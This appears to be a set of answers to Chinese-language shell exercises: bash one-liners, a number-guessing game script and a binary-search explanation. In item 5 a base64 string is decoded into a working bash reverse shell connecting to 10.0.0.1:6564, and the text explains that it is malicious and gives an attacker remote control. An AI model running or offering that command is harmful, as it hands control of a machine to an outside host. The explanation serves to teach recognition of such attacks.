1.[[ $USER == "root" ]] && echo "hi, root" || echo $USER
2.
#!/bin/bash

# 生成随机数
random_number=$(( (RANDOM % 20) + 1 ))
guesses=0

# 游戏循环，最多5次机会
while [ $guesses -lt 5 ]; do
    read -p "请输入一个猜测的数字（1-20）：" guess

    # 检查猜测的数字与随机数的关系
    if [ $guess -gt $random_number ]; then
        echo "猜大了"
    elif [ $guess -lt $random_number ]; then
        echo "猜小了"
    else
        echo "猜中啦"
        exit 0
    fi

    guesses=$((guesses + 1))
done

echo "游戏结束，您没有猜中。正确答案是 $random_number"
3.可以使用二分查找算法，先选择中间的数字500作为第一次猜测。如果猜中了，游戏结束；如果猜大了那么就说明目标数字在0-499之间，下一次猜测范围缩小为0-499；如果猜小了，那么就说明目标数字在501-1000之间，下一次猜测范围缩小为501-1000。综上，最少需要猜测10次才能保证猜中范围为0-1000的随机数字。每次猜测都将范围缩小一半，直到找到目标数字。
4.[[ $(echo "$(uname -r | cut -d. -f1-2) > 5.4" | bc -l) -eq 1 ]] && echo "yes" || echo "no"
5.这是一串base64的编码，解码后为0<&196;exec 196<>/dev/tcp/10.0.0.1/6564; bash <&196 >&196 2>&196
命令说明：
解码后的命令是一个具有恶意意图的Shell命令，它尝试通过网络连接到IP地址为10.0.0.1，端口号为6564的主机。一旦连接成功，它会将当前的Bash会话重定向到该连接上，使得攻击者可以在远程主机上执行命令，并且将命令的输入和输出都重定向到该连接上。这种类型的命令常被用于远程控制、植入恶意软件或进行其他未经授权的活动。
